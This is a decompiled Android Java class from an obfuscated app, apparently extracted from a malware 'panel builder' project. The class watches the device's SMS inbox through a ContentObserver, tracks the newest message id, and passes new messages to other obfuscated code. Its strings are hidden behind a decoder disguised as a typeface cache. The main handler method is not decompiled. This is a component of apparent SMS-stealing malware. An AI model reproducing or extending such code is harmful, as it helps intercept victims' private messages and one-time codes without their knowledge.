package v.s;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class s6gkfffFcXvYHWNdDTq extends ContentObserver {
    public static final /* synthetic */ int vekpFI4d1Nc4fakF = 0;
    public static volatile long w9sT1Swbhx3hs;
    public final Context dDIMxZXP1V8HdM;

    static {
        TypefaceCache.obtain("000000770058008F00F5009600FF009000310077004B009700F500AD");
        w9sT1Swbhx3hs = -1L;
    }

    public s6gkfffFcXvYHWNdDTq(Context context, Handler handler) {
        super(handler);
        this.dDIMxZXP1V8HdM = context;
    }

    /* JADX WARN: Code duplicated, block: B:29:0x00d9 A[Catch: all -> 0x006a, TryCatch #6 {all -> 0x006a, blocks: (B:12:0x004a, B:27:0x00d3, B:29:0x00d9, B:31:0x00ed, B:32:0x00f3, B:35:0x0101, B:37:0x0119), top: B:83:0x004a }] */
    /* JADX WARN: Code duplicated, block: B:31:0x00ed A[Catch: all -> 0x006a, TryCatch #6 {all -> 0x006a, blocks: (B:12:0x004a, B:27:0x00d3, B:29:0x00d9, B:31:0x00ed, B:32:0x00f3, B:35:0x0101, B:37:0x0119), top: B:83:0x004a }] */
    /* JADX WARN: Code duplicated, block: B:34:0x00ff  */
    /* JADX WARN: Code duplicated, block: B:37:0x0119 A[Catch: all -> 0x006a, TRY_LEAVE, TryCatch #6 {all -> 0x006a, blocks: (B:12:0x004a, B:27:0x00d3, B:29:0x00d9, B:31:0x00ed, B:32:0x00f3, B:35:0x0101, B:37:0x0119), top: B:83:0x004a }] */
    /* JADX WARN: Code duplicated, block: B:44:0x013c A[Catch: all -> 0x0139, TRY_LEAVE, TryCatch #5 {all -> 0x0139, blocks: (B:40:0x012f, B:44:0x013c), top: B:81:0x012f }] */
    /* JADX WARN: Code duplicated, block: B:47:0x0199 A[RETURN] */
    /* JADX WARN: Code duplicated, block: B:48:0x019a  */
    /* JADX WARN: Code duplicated, block: B:51:0x01ac A[Catch: all -> 0x01c3, TryCatch #2 {all -> 0x01c3, blocks: (B:49:0x01a8, B:51:0x01ac, B:54:0x01c6), top: B:77:0x01a8 }] */
    /* JADX WARN: Code duplicated, block: B:7:0x001c  */
    /* JADX WARN: Code duplicated, block: B:81:0x012f A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r10v1 */
    /* JADX WARN: Type inference failed for: r10v10 */
    /* JADX WARN: Type inference failed for: r10v2, types: [android.database.Cursor] */
    /* JADX WARN: Type inference failed for: r10v3 */
    /* JADX WARN: Type inference failed for: r10v4 */
    /* JADX WARN: Type inference failed for: r10v6 */
    /* JADX WARN: Type inference failed for: r10v7 */
    /* JADX WARN: Type inference failed for: r10v8 */
    /* JADX WARN: Type inference failed for: r10v9 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:48:0x019a -> B:77:0x01a8). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:58:0x01d5 -> B:56:0x01cb). Please report as a decompilation issue!!! */
    /*  JADX ERROR: JadxOverflowException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxOverflowException: Regions stack size limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        */
    public static final java.lang.Object dDIMxZXP1V8HdM(v.s.s6gkfffFcXvYHWNdDTq r27, v.s.CWIOrUfHtKyaxQib0W r28) {
        /*
            Method dump skipped, instruction units count: 525
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: v.s.s6gkfffFcXvYHWNdDTq.dDIMxZXP1V8HdM(v.s.s6gkfffFcXvYHWNdDTq, v.s.CWIOrUfHtKyaxQib0W):java.lang.Object");
    }

    @Override // android.database.ContentObserver
    public final void onChange(boolean z, Uri uri) {
        super.onChange(z, uri);
        if (w9sT1Swbhx3hs <= 0) {
            w9sT1Swbhx3hs();
        } else {
            y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new eyavN4VgkDpngkAKt(this, null, 0), 3);
        }
    }

    public final void w9sT1Swbhx3hs() {
        try {
            Cursor cursorQuery = this.dDIMxZXP1V8HdM.getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, new String[]{"_id"}, null, null, "_id" + TypefaceCache.obtain("00630052007E00B400D300FF00FE008E000E005F006F00C700A1"));
            if (cursorQuery != null) {
                try {
                    if (cursorQuery.moveToFirst()) {
                        w9sT1Swbhx3hs = cursorQuery.getLong(0);
                        TypefaceCache.obtain("000A00780052009300F900BE00DE00AE00390073005F00C700FC00BE00C100B3001300640054008400F500AC00C100A20027005F005F00DA");
                    }
                    cursorQuery.close();
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                        throw th2;
                    }
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002A00780052009300DC00BE00C100B3000A0072001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
    }
}
